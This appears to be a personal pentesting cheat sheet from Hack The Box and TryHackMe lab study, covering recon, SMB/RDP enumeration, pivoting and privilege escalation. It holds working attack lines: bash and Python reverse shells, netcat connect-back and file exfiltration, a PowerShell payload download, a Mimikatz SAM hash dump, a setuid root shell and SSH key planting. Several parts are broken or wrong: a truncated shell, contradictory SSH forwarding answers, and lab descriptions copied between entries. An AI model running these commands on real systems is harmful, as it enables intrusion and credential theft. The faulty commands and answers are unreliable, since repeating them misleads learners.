# Title

Solution to the Python reverse encryption script that is provided in the **Bold: *Italic***

## **Title 2**
```python           //// code box
sample code
```

# Alen & Mitch’s Hack E’Spezialle

## Essential Gadget Collection:

**Legion** - Nmap but through GUI

**Dirsearch** - Directory discovery tool

**Gobuster** -Directory/Sub-domain and DNS Discovery Tool. 
https://www.hackingarticles.in/comprehensive-guide-on-gobuster-tool/ 

**SQL-MAP** - Sql parameter discovery and exploitation tool

**Nikto** - Port 80 HTTP mapping tool

**AutoRecon** - https://github.com/Tib3rius/AutoRecon - Automatically launches scanes, along with subsequent scans based on services enumerated.

**nmapAutomator** - https://github.com/21y4d/nmapAutomator - Background nmap

**Plink.exe**

**Socat** - encrypted exfiltration and port forwarding

**Proxychains & FoxyProxy** - Proxying

**Chisel** -  https://github.com/jpillora/chisel Reverse shells without SSH

Script for auto install:

-------------------------------------------------------------------------------------------------------------------------------

Passive Reconnaissance:
Website - http://fingerprint.com/

DNSDumpster - https://dnsdumpster.com/ dns record enumeration and lookup tool 

Website-HackerTarget.com - Collection of hosted scanner tools https://hackertarget.com/(note this one links to a TON of useful sites and courses some of which are even free to take)

Whoami - http://whoami.org/ Checks for site owners and such.

https://www.speedguide.net/port.php?port= - Intelligence on services running on ports

-------------------------------------------------------------------------------------------------------------------------------

Active Reconnaissance:

nmap -sVC (version check) IP -T1-5 (3 being the default) --script=vuln (checks for known exploits) // grep "ftp" /usr/share/nmap/scripts/script.db if searching for scripts. Script.db is the default list of scripts available for nmap and when activating a script /usr/share/nmap/scripts/ is the default folder nmap will check. it's also possible to install the scripts manually by downloading the script from Nmap (sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse). This must then be followed up with nmap --script-updatedb, which updates the script.db file to contain the newly downloaded script.

cURL fetches the website through command line. Default is a GET request, POST is (-X POST --data <blabla>)

Legion - Nmap but through GUI

Dirsearch - Directory discovery tool

Gobuster -Directory Discovery Tool

SQL-MAP - Sql parameter discovery and exploitation tool

Nikto - Port 80 HTTP mapping tool

AutoRecon - https://github.com/Tib3rius/AutoRecon - Automatically launches scanes, along with subsequent scans based on services enumerated.

Subdomain discovery: 
gobuster -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt vhost -u http://schooled.htb -o subdomain_schooled.htb

ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u http://schooled.htb -H "Host: FUZZ.schooled.htb" -fw 5338

Echo “10.10.10.10	tenet.htb” >> /etc/hosts/ - Adds the domain to the hosts file in Linux in order to properly resolve

Port 53 - DNS or Bind: 
can be sent a DNS request with it’s own IP to see what the domain is with the dig command. Example code: 
	dig @10.10.10.10 -x 10.10.10.10
Ports 135-139 & 445 SMB, RPC and NetBIOS Enumeration:
Scan for popular RCE exploits:
sudo nmap -p 139,445 --script smb-vuln* <ip-addr> -oA nmap/smb-vuln

Identify the SMB/OS version:
nmap -v -p 139,445 --script=smb-os-discovery.nse <ip-addr>

Enumerate users once you have valid credentials:
sudo nmap --script=smb-enum-users -p 445 10.130.40.70 --script-args smbuser=<user>,smbpass=<password>

To scan a subnet for list of hostnames:
nbtscan -v <targetRange>

Using SMBMAP
To list out the shares and associated permissions with Anonymous Access:
smbmap -H <ip-addr>

To list out the shares recursively:
smbmap -R <sharename> -H <ip-addr>

To list shares as an authenticated user:
smbmap -d <domain> -u <username> -p <password> -H <ip-addr>

To list the shares as a Guest user, just provide a username that doesn’t exist.
smbmap -u DoesNotExist -H <ip-addr>

To download a particular file.
smbmap -R <sharename> -H <ip-addr> -A <filename> -q

Using SMBCLIENT
To list out the shares:
smbclient -L \\\\<ip-addr>

To connect to shares:
sudo smbclient \\\\<ip-addr>\\<share>

https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/

RDP
xfreerdp /u:Administrator /v:10.10.29.199
or
xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea

As mentioned, xfreerdp is an incredibly versatile tool with a vast number of options available. These range from routing audio and USB connections into the target, through to pass-the-hash attacks over RDP. The most basic syntax for connecting is as follows:
xfreerdp /v:IP /u:USERNAME /p:PASSWORD

For example:
xfreerdp /v:172.16.0.5 /u:user /p:'password123!'

Note that (as this is a command line tool), passwords containing special characters must be enclosed in quotes.

When authentication has successfully taken place, a new window will open giving GUI access to the target.
Demonstration of logging in over RDP

That said, we can do a lot more with xfreerdp. These switches are particularly useful:-

/dynamic-resolution -- allows us to resize the window, adjusting the resolution of the target in the process
/size:WIDTHxHEIGHT -- sets a specific size for targets that don't resize automatically with /dynamic-resolution
+clipboard -- enables clipboard support
/drive:LOCAL_DIRECTORY,SHARE_NAME -- creates a shared drive between the attacking machine and the target. This switch is insanely useful as it allows us to very easily use our toolkit on the remote target, and save any outputs back directly to our own hard drive. In essence, this means that we never actually have to create any files on the target. For example, to share the current directory in a share called share, you could use: /drive:.,share, with the period (.) referring to the current directory
When creating a shared drive, this can be accessed either from the command line as \\tsclient\, or through File Explorer under "This PC":
Showing the share created by xfreerdp when specifying /drive

Note that the name of the share will change according to what you selected in the /drive switch.

A useful directory to share is the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will be using next. This would make the full command:

xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share

With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next we open up a cmd.exe or PowerShell window as an administrator (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:
\\tsclient\share\mimikatz\x64\mimikatz.exe
Accessing mimikatz via the RDP share

Note: if you used a different share name, you would need to substitute this in. Equally, if the command errors out, you may need to install mimikatz on Kali with sudo apt install mimikatz.

With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:
privilege::debug
token::elevate
Elevating privileges in mimikatz

If we want we could log Mimikatz output with the log command. For example: log c:\windows\temp\mimikatz.log, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.

We can now dump all of the SAM local password hashes using:
lsadump::sam

Near the top of the results you will see the Administrator's NTLM hash:

Port Intelligence:
22 - ssh
53 - DNS (can be tested with the “dig” command)
80 - http
88 - kerberos
135 - RPC
139 - SMB
389 - LDAP
443 - https
445 - RCE
636 - SSL/LDAP
31337 - known virus port “elite”
Unknown ports (5555, 7777, 31337…) - these ports will sometimes allow a netcat session to them.

-------------------------------------------------------------------------------------------------------------------------------
Pivoting:

As a summary of the tools in this section:

Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
SSH can be used to create both port forwards, and proxies
plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
sshuttle is a nicer way to create a proxy when we have SSH access on a target

SSH: 
If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?

L

Which switch combination can be used to background an SSH port forward or tunnel?

-fN

It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?

Nay

What command would you use to create a pair of throwaway SSH keys for a reverse connection?

Ssh-keygen

If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")

ssh -L 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN

What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

ssh -L 8000 user@target.thm -fN

If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.

ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN

Socat: 
If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?

Use TCP port 8000 for the server listener, and do not background the process.
./socat tcp-l:8000 tcp:172.16.0.200:443

What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?

./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &

Chiesel:

What command would you use to start a chisel server for a reverse connection on your attacking machine?

Use port 4242 for the listener and do not background the process.

./chiesel server -p 4242 --reverse

What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?

./chiesel client 172.16.0.200:4242 R:socks &

How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.

./chiesel client 172.16.0.100:3306 R:33060 172.16.0.200:1337 &

If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?

./chiesel client 172.16.0.5:4444 8000:172.16.0.10:80

Sshuttle:

How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16

sshuttle -r pwned@172.16.20.7 172.16.0.0/16

What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?

--ssh-cmd "ssh -i priv_key"

You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.

What switch (and argument) could you use to fix this error?

-x 172.16.0.100

Wraith practical example: sshuttle -r root@10.200.98.200 --ssh-cmd "ssh -i id_rsa_wreath" 10.200.98.0/24 -x 10.200.98.200

-------------------------------------------------------------------------------------------------------------------------------
Reverse Shells:
Python:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))


Bash:
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Netcat:
nc -N 10.10.16.160 1717

File exfiltration using Netcat:
nc -N 10.10.16.160 1717 < /env/variable/

https://www.maketecheasier.com/netcat-transfer-files-between-linux-computers/


-------------------------------------------------------------------------------------------------------------------------------

Attacks:

CSTrace - Cross Site Tracing Software Attack | OWASP Foundation 

Http-prompt - Tool for sending HTTP responses: http://http-prompt.com/


-------------------------------------------------------------------------------------------------------------------------------

Methodologies:

https://www.youtube.com/watch?v=VpNaPAh93vE

-------------------------------------------------------------------------------------------------------------------------------

Privilege Escalation Techniques:

dirty_sock: Linux Privilege Escalation (via snapd): https://github.com/initstring/dirty_sock


Python: Privilege Escalation on Linux
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'



-------------------------------------------------------------------------------------------------------------------------------
Cheat Sheets:
PayloadAllTheThings - PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings

GTFObin - https://gtfobins.github.io/

Monkey Reverse Shells - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

LOLBAS Privilege Escalation Windows - https://lolbas-project.github.io/

-------------------------------------------------------------------------------------------------------------------------------

Syntax:
Powershell
Download a file:
powershell -c "(new-Object System.Net.WebClient).DownloadFile('http://10.9.6.87:8080/shell.exe', 'C:\Users\Administrator\Desktop\payload.exe')"



-------------------------------------------------------------------------------------------------------------------------------

Buffer Overflows:
TryHackMe Exercises around Buffer Overflows:
https://docs.google.com/document/d/1DCM64C1fTBqakPzLxdQU8Vq0TnOBLrk3aO_gYNSfcJs/edit?usp=sharing

-------------------------------------------------------------------------------------------------------------------------------
SSH manipulation techniques:
Relevant files: id_rsa (private key), id_rsa.pub (public key), authorized_keys (entries for allowed connects)

ssh-keygen (generates new ssh keys)

echo “ssh-rsa AAAAAA******id_rsa.pub here******” >> authorized_keys

ssh -i id_rsa user@10.10.10.10

If you wanted to set up a reverse port forward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")

ssh -R 2222:172.16.0.100:20 kali@172.16.0.200 -i id_rsa -fN

What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

ssh -R 8000 user@target.thm -fN

If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.

ssh -L 8000:172.16.0.50:80 user@127.0.0.1 -fN

-------------------------------------------------------------------------------------------------------------------------------
Post Exploitation:
TryhackMe exercise with Mimikatz, PowerView, Powershell, Server Manager and Maintaining access with Metasploit (msfconsole & msfvenom):
https://docs.google.com/document/d/1Mrt7UoOLNYKmAsCt4IoS6eaWBcaHzPLMhvE6ZVMY5u8/edit?usp=sharing
 
-------------------------------------------------------------------------------------------------------------------------------

YouTube Channels & Playlists:
Watch Hackersploit (EC Playlist):
https://www.youtube.com/playlist?list=PLBf0hzazHTGOEuhPQSnq-Ej8jRyXxfYvl

Watch IppSec (HTB Guides):
https://www.youtube.com/c/ippsec/playlists

Watch The Cyber Mentor (Buffer Overflow Playlist):
https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G
https://github.com/johnjhacking/Buffer-Overflow-Guide

Watch TJNull (OSCP Prep Playlist):
https://www.youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf

Watch C0nda - 
https://www.youtube.com/channel/UCzK5oAENyQJcnH5SvEquo8A

-------------------------------------------------------------------------------------------------------------------------------
Hack The Box Machines:
Easy:

Spectra - Focuses around exploiting insecure WordPress website configs. Includes elements from SQL, Metasploit, Wordpress, Permissions and  PHP reverse shell manipulation: https://docs.google.com/document/d/1A4oAOoEh2zYTj-Q_kskPeezeZQNKsQ4ZS9BfTLAlLzg/edit	CVE References: None

ScriptKiddie -  Centered around exploiting a custom coded website that offers hacking tools. Utilizes msfvenom to generate a payload, Python shell escalation and adding a bash reverse shell to a file and exploiting group ownerships. Finally runs msfconsole as sudo to find the root flag: 
https://docs.google.com/document/d/1xxPrAttTG8ZjyJY711EUVVrq1lX-qPaUyQbRaz8nRNI/edit	CVE References: CVE-2020-7384

Armaggeddon - Exploiting Drupal 7 with metasploit, look around with mysql syntax, decrypt captured passwords with John, dirty_sock Linux privilege escalation (via snapd).
https://docs.google.com/document/d/1LlITG8fnqfq93unxR5i99pFETqAmM5DPHUVk5fWMzAQ/edit	CVE References: CVE-2018-7600, CVE-2019-7304

Knife - 
https://docs.google.com/document/d/1VZaaHWtJO1Wsv8RmJWpA70eNwxf-ciU2mOGnLVV4WKs/edit		CVE References: None

Love - 
https://docs.google.com/document/d/1TmOn982HTnxuNczHpeO_xt8b5fv3AX4A9jsAdGaK_UA/edit	CVE References: None

Cap - Basic enumeration, followed by checking out the website, retrieving the .pcap capture. The trick is to start at 0, retrieve the file and follow the tcp stream to find the first user’s login information. After that it’s just a simple Python privilege escalation, which works because the file in /var/www/html/app.py is able to switch between suid(0) and suid(1).
https://docs.google.com/document/d/1Dqu4rM9xmHysNlA3p0UmpxWfputRzrZGSHokQsq-uss/edit?usp=sharing	CVE References: None

Medium:

Opichui - 
https://docs.google.com/document/d/17slVunI17mGQRKqF0HchmfAeFtmza3DCF3Uou04ZMdI/edit	CVE References: None

Schoold - Schooled teaches us about subdomain enumeration, moodle exploits, cookie hijacking, side hopping, php reverse shells, john password decryption and pkg compiling and installing. This lab focuses strongly on exploiting moodle. Great for learning modification of cookies.
https://docs.google.com/document/d/1TmOn982HTnxuNczHpeO_xt8b5fv3AX4A9jsAdGaK_UA/edit	CVE References: CVE-2020-14321

The Notebook - The Notebook introduces us to jwt token manipulation. Lots of interesting lessons on base64 encoding/decoding, constructing cookies and manipulating them. Great insight into transferring files using netcat. This machine also shows us how to manipulate the docker exec environment for privilege escalation. Touches on “go” and “tar” files, as well as ssh private keys for verification.
https://docs.google.com/document/d/1iaPFow8dcMz50kI9Oqc3EWJ8HgRBEXlIMm4MPFZ3544/edit	CVE References: CVE-2019-5736

Atom - Schooled teaches us about subdomain enumeration, moodle exploits, cookie hijacking, side hopping, php reverse shells, john password decryption and pkg compiling and installing. This lab focuses strongly on exploiting moodle. Great for learning modification of cookies.
https://docs.google.com/document/d/1mfs1mHz3EOgLN3tHf9Xk9VCtKmVK2y7HnfBnrLcrclA/edit?usp=sharing 	CVE References: None

The Pit - Schooled teaches us about subdomain enumeration, moodle exploits, cookie hijacking, side hopping, php reverse shells, john password decryption and pkg compiling and installing. This lab focuses strongly on exploiting moodle. Great for learning modification of cookies.
https://docs.google.com/document/d/1RAWDfxYdzYOSjbDcaFzPr2aJzhkVXPJLx0sDBmBc0cU/edit?usp=sharing 	CVE References: None

DYNSTR - Description
https://docs.google.com/document/d/1B6_hyzVPtBN115xGGXGEBse7i5yCXtqtDdO2PlIsaSQ/edit?usp=sharing	CVE References: None

Intelligence - No shell attacking Kerberos and enumeration in a DC environment misconfiguration. Uses a few tools from impackets and lots of python. Touches on pdf metadata, smb, and impackets.
https://docs.google.com/document/d/16STA-rzm2u11221d4JQghG5iDXeNU6VZd5d_V1XDWbY/edit?usp=sharing 	CVE References: None


In-progress:

Fortress:

Jet - https://docs.google.com/document/d/1kVbs9wuX68LRW15k3RPCONymS0toUFmEGNuJkN_W7V0/edit	CVE References: None


-------------------------------------------------------------------------------------------------------------------------------


Linux Tips:
Aliases - Command: alias shortName=”command”
Checking public IP - Command: curl ifconfig.me 
/etc/hosts/ - Adding hosts to /etc/hosts file
xdg-open ./ - opens directory in current working. Can be added as an alias
/usr/share/webshells/php/ - has backdoors and reverse shells in it. Has to be copied and modified before use!
/usr/share/wordlists/rockyou.txt - contains wordlists such as rockyou.txt

-------------------------------------------------------------------------------------------------------------------------------

Windows Tips:

-------------------------------------------------------------------------------------------------------------------------------

VM Troubleshooting:
In the middle of doing labs, Kali kept losing connection. Only IPv6 would assign, network unreachable, basically every issue possible. Settings on kali seemed OK, but why would it suddenly stop working on several occasions? The reason was that VMware had [automatic] selected under Bridged Adapter. This means it would periodically try to access alternative adapters in network interfaces to connect to the internet so it kept failing. 

Changing MTU default size may brick the network adapter!


-------------------------------------------------------------------------------------------------------------------------------
